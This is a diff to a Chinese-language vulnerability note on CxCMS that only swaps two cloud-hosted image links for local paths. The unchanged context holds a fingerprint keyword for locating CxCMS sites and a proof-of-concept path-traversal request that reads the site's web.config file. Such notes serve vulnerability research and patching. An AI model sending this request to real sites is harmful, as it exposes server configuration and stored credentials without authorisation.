@@ -20,7 +20,7 @@ CxCMS
 
 关键字"Powered by CxCms"
 
-![image-20220518144245685](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181442728.png)
+![image-20220518144245685](./images/202205181442728.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ CxCMS
 /Sys/Handler/Resource.ashx?_FilePath=../../web.config
 ```
 
-![image-20220518144331101](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181443193.png)
+![image-20220518144331101](./images/202205181443193.png)
